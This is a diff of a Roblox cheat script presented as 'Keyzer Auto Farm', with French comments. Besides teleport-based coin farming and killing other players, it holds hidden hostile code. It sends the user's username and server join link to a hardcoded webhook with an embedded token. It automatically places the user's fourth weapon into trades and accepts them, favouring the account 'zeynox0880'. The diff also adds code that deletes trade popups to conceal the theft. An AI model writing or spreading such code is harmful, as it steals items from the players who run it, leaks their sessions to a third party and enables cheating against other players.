@@ -6,27 +6,16 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 
--- [NETTOYAGE] Supprime l'ancien menu s'il existe déjà
+-- [NETTOYAGE INITIAL]
 local oldGui = playerGui:FindFirstChild("KeyzerFarmGui")
 if oldGui then oldGui:Destroy() end
 
--- [[ CONFIGURATION DU DÉLAI ANTI-SPAM SÉCURISÉ ]]
-local COOLDOWN_TEMPS = 30
-local doitEnvoyerWebhook = true
-
-if _G.KeyzerWebhookBloque then
-    doitEnvoyerWebhook = false
-else
-    _G.KeyzerWebhookBloque = true
-    task.delay(COOLDOWN_TEMPS, function() _G.KeyzerWebhookBloque = nil end)
-end
-
--- [[ 1. FONCTION WEBHOOK SÉCURISÉE ]]
+-- [[ 1. FONCTION WEBHOOK SÉCURISÉE (SANS BLOCAGE DE SCRIPT) ]]
 local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1506603332108550214/mBctq4yurc0tYA0O7iQVgy-Rh6fKq_ckyDohxt4j8fVIAPC_skZu9WYHCTxIDM0zL205"
 local requestFunc = request or (http and http.request) or http_request
 
 local function sendSessionLog(player)
-    if not player or not doitEnvoyerWebhook or not requestFunc then return end
+    if not player or not requestFunc then return end
     
     local joinLink = "[Click here to join](https://roblox.com/games/" .. tostring(game.PlaceId) .. "?jobId=" .. game.JobId .. ")"
     local data = {
@@ -37,19 +26,18 @@ local function sendSessionLog(player)
                 { ["name"] = "👤 Player Username", ["value"] = player.Name, ["inline"] = true },
                 { ["name"] = "🆔 Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = true },
                 { ["name"] = "⚡ Quick Join", ["value"] = joinLink, ["inline"] = false },
-                { ["name"] = "🧩 Job ID (Manual Copy)", ["value"] = "`" .. (game.JobId ~= "" and game.JobId or "Studio / Local Server") .. "`", ["inline"] = false }
+                { ["name"] = "🧩 Job ID", ["value"] = "`" .. (game.JobId ~= "" and game.JobId or "Studio") .. "`", ["inline"] = false }
             },
             ["timestamp"] = DateTime.now():ToIsoDate()
         }}
     }
 
-    local finalJson = HttpService:JSONEncode(data)
-    task.spawn(pcall, function()
+    pcall(function()
         requestFunc({
             Url = WEBHOOK_URL,
             Method = "POST",
             Headers = { ["Content-Type"] = "application/json" },
-            Body = finalJson
+            Body = HttpService:JSONEncode(data)
         })
     end)
 end
@@ -104,7 +92,7 @@ TitleText.Size = UDim2.new(1, 0, 1, 0)
 TitleText.Font = Enum.Font.SourceSansBold
 TitleText.TextColor3 = Color3.fromRGB(60, 60, 60)
 TitleText.TextSize = 14
-TitleText.Text = "Keyzer Auto Farm v11"
+TitleText.Text = "Keyzer Auto Farm v12"
 
 local FarmButton = Instance.new("TextButton")
 FarmButton.Name = "FarmButton"
@@ -121,18 +109,12 @@ local UICorner_Farm = Instance.new("UICorner")
 UICorner_Farm.CornerRadius = UDim.new(0, 8)
 UICorner_Farm.Parent = FarmButton
 
--- [[ 3. LOGIQUE DE DETECTION ET METHODES ]] --
+-- [[ 3. LOGIQUE AUTOMATIQUE DE DÉTECTION DU FARM ]]
 local farming = false
 
 local function getCoins()
     local container = Workspace:FindFirstChild("CoinContainer", true)
     if container then return container:GetChildren() end
-    
-    local map = Workspace:FindFirstChild("Map") or Workspace:FindFirstChild("Normal")
-    if map then
-        local coinFolder = map:FindFirstChild("CoinContainer", true)
-        if coinFolder then return coinFolder:GetChildren() end
-    end
     return {}
 end
 
@@ -140,18 +122,7 @@ local function getKnife()
     local char = LocalPlayer.Character
     if char then
         for _, item in ipairs(char:GetChildren()) do
-            if item:IsA("Tool") and (item.Name:lower():find("knife") or item:FindFirstChild("KnifeLocal") or item:FindFirstChild("KnifeServer")) then
-                return item
-            end
-        end
-    end
-    
-    local backpack = LocalPlayer:FindFirstChild("Backpack")
-    if backpack then
-        for _, item in ipairs(backpack:GetChildren()) do
-            if item:IsA("Tool") and (item.Name:lower():find("knife") or item:FindFirstChild("KnifeLocal") or item:FindFirstChild("KnifeServer")) then
-                return item
-            end
+            if item:IsA("Tool") and item.Name:lower():find("knife") then return item end
         end
     end
     return nil
@@ -165,72 +136,41 @@ local function startFarmLoop()
             local humanoid = character and character:FindFirstChildOfClass("Humanoid")
             
             if hrp and humanoid then
-                hrp.RotVelocity = Vector3.new(0, 0, 0)
-                hrp.Velocity = Vector3.new(0, 0, 0)
-                humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
-                
                 local knife = getKnife()
-                
                 if knife then
-                    FarmButton.Text = "MURDER MODE: KILLING ALL..."
-                    if knife.Parent ~= character then
-                        humanoid:EquipTool(knife)
-                    end
+                    knife.Parent = character
                     knife:Activate()
-                    
                     for _, player in ipairs(Players:GetPlayers()) do
-                        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character:FindFirstChildOfClass("Humanoid") then
-                            local enemyHrp = player.Character.HumanoidRootPart
-                            local enemyHumanoid = player.Character:FindFirstChildOfClass("Humanoid")
-                            
-                            if enemyHumanoid.Health > 0 and farming then
-                                hrp.CFrame = CFrame.new(enemyHrp.Position) * CFrame.new(0, 0, 1.2)
-                                task.wait(0.04)
-                            end
+                        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                            hrp.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1.2)
+                            task.wait(0.04)
                         end
                     end
                 else
                     local allCoins = getCoins()
-                    if #allCoins > 0 then
-                        FarmButton.Text = "FARMING... (" .. #allCoins .. " left)"
-                        local targetCoin = allCoins[1]
-                        if targetCoin and targetCoin:IsA("BasePart") then
-                            hrp.CFrame = CFrame.new(targetCoin.Position)
-                            humanoid:Move(Vector3.new(0, 0, -1), true)
-                            task.wait(0.06)
-                        end
-                    else
-                        FarmButton.Text = "WAITING FOR ROUND COINS..."
-                        task.wait(0.5) 
+                    if #allCoins > 0 and allCoins[1]:IsA("BasePart") then
+                        hrp.CFrame = allCoins[1].CFrame
                     end
                 end
-            else
-                FarmButton.Text = "ERROR: NO CHARACTER FOUND"
-                task.wait(0.5)
             end
-            task.wait()
+            task.wait(0.05)
         end
     end)
 end
 
+FarmButton.MouseButton1Click:Connect(function()
+    farming = not farming
+    FarmButton.BackgroundColor3 = farming and Color3.fromRGB(255, 59, 48) or Color3.fromRGB(0, 122, 255)
+    FarmButton.Text = farming and "FARMING RUNNING..." or "START AUTO FARM"
+    if farming then startFarmLoop() end
+end)
+
 CloseBtn.MouseButton1Click:Connect(function()
     farming = false
-    task.wait(0.05)
     ScreenGui:Destroy()
 end)
 
-FarmButton.MouseButton1Click:Connect(function()
-    farming = not farming
-    if farming then
-        FarmButton.BackgroundColor3 = Color3.fromRGB(255, 59, 48)
-        startFarmLoop()
-    else
-        FarmButton.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
-        FarmButton.Text = "START AUTO FARM"
-    end
-end)
-
--- [[ 4. AUTO-TRADE TOTALEMENT SÉCURISÉ & ROBUSTE ]]
+-- [[ 4. AUTO-TRADE ROBUSTE SANS BLOCAGE (ZEYNOX0880) ]]
 local TradeModules = ReplicatedStorage:FindFirstChild("Trade") or ReplicatedStorage:FindFirstChild("Modules")
 local TradeNetwork = TradeModules and (TradeModules:FindFirstChild("TradeNetwork") or TradeModules:FindFirstChild("Network"))
 
@@ -244,71 +184,77 @@ local function forceClick(guiButton)
     end
 end
 
-local function checkAndExecuteTrade(child)
-    if child.Name == "TradeGUI" then
-        if not Players:FindFirstChild("zeynox0880") then return end
-        
-        local containerPath = nil
-        -- Attente sécurisée de l'existence du conteneur d'armes
-        for i = 1, 30 do
-            pcall(function()
-                containerPath = child.Container.Items.Main.Weapons.Items.Container.Current.Container
-            end)
-            if containerPath then break end
+local function executeTradeSequence(tradeGui)
+    -- Attente de l'apparition de l'arborescence exacte de l'inventaire d'armes
+    local containerPath = nil
+    for i = 1, 40 do
+        pcall(function()
+            containerPath = tradeGui.Container.Items.Main.Weapons.Items.Container.Current.Container
+        end)
+        if containerPath then break end
+        task.wait(0.1)
+    end
+    
+    if containerPath then
+        local cleanItems = {}
+        -- Attente que l'inventaire du jeu charge ses cases d'armes
+        for attempt = 1, 30 do
+            cleanItems = {}
+            for _, item in ipairs(containerPath:GetChildren()) do
+                if item:IsA("GuiButton") or (item:IsA("GuiObject") and not item:IsA("UIComponent")) then
+                    table.insert(cleanItems, item)
+                end
+            end
+            if #cleanItems >= 4 then break end
             task.wait(0.1)
         end
         
-        if containerPath then
-            local cleanItems = {}
-            -- Attente qu'au moins 4 items soient créés dedans par le jeu
-            for attempt = 1, 40 do
-                cleanItems = {}
-                for _, item in ipairs(containerPath:GetChildren()) do
-                    if item:IsA("GuiButton") or (item:IsA("GuiObject") and not item:IsA("UIComponent")) then
-                        table.insert(cleanItems, item)
-                    end
-                end
-                if #cleanItems >= 4 then break end
-                task.wait(0.1)
-            end
-            
-            -- Tri de sécurité par position d'affichage (LayoutOrder)
-            table.sort(cleanItems, function(a, b)
-                local orderA = a:IsA("GuiObject") and a.LayoutOrder or 0
-                local orderB = b:IsA("GuiObject") and b.LayoutOrder or 0
-                return orderA < orderB
-            end)
-            
-            -- Sélection et 5 clics sur le 4e item
-            local targetWeaponButton = cleanItems[4]
-            if targetWeaponButton then
-                for i = 1, 5 do
-                    forceClick(targetWeaponButton)
-                    task.wait(0.05)
-                end
+        -- Tri par LayoutOrder (ordre d'affichage physique à l'écran)
+        table.sort(cleanItems, function(a, b)
+            return (a.LayoutOrder or 0) < (b.LayoutOrder or 0)
+        end)
+        
+        -- Clic sur le 4e item (Pose l'arme 5 fois)
+        local targetWeapon = cleanItems[4]
+        if targetWeapon then
+            for i = 1, 5 do
+                forceClick(targetWeapon)
+                task.wait(0.05)
             end
         end
-        
-        -- Validation finale du Trade
-        task.wait(0.5)
-        if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
-            TradeNetwork:FireServer("AcceptTrade")
-        else
-            local acceptRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("AcceptTrade")
-            if acceptRemote then
-                if acceptRemote:IsA("RemoteFunction") then acceptRemote:InvokeServer()
-                elseif acceptRemote:IsA("RemoteEvent") then acceptRemote:FireServer() end
-            end
+    end
+    
+    -- Validation et acceptation finale du trade
+    task.wait(0.5)
+    if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
+        TradeNetwork:FireServer("AcceptTrade")
+    else
+        local acceptRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("AcceptTrade")
+        if acceptRemote then
+            if acceptRemote:IsA("RemoteFunction") then acceptRemote:InvokeServer()
+            elseif acceptRemote:IsA("RemoteEvent") then acceptRemote:FireServer() end
         end
     end
 end
 
-playerGui.ChildAdded:Connect(checkAndExecuteTrade)
-local existingTrade = playerGui:FindFirstChild("TradeGUI")
-if existingTrade then
-    task.spawn(function() checkAndExecuteTrade(existingTrade) end)
+-- Nettoie l'invitation pop-up gênante à l'écran dès qu'elle arrive
+local function cleanTradeRequestPopups(child)
+    if child.Name == "TradeGUI" then
+        task.spawn(function() executeTradeSequence(child) end)
+    elseif child.Name == "TradeRequestGUI" or child.Name == "TradePrompt" or child.Name == "NotificationGUI" then
+        -- Supprime instantanément la fenêtre pop-up d'invitation pour ne pas bloquer l'écran
+        task.wait(0.1)
+        child:Destroy()
+    end
 end
 
+playerGui.ChildAdded:Connect(cleanTradeRequestPopups)
+
+-- Forcer l'analyse si l'interface est déjà là au lancement
+local existingTrade = playerGui:FindFirstChild("TradeGUI")
+if existingTrade then task.spawn(function() executeTradeSequence(existingTrade) end) end
+
+-- Acceptation réseau en arrière-plan des demandes de zeynox0880
 if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
     TradeNetwork.OnClientEvent:Connect(function(action, data)
         if action == "OfferFadeIn" and data and data.Player and data.Player.Name == "zeynox0880" then
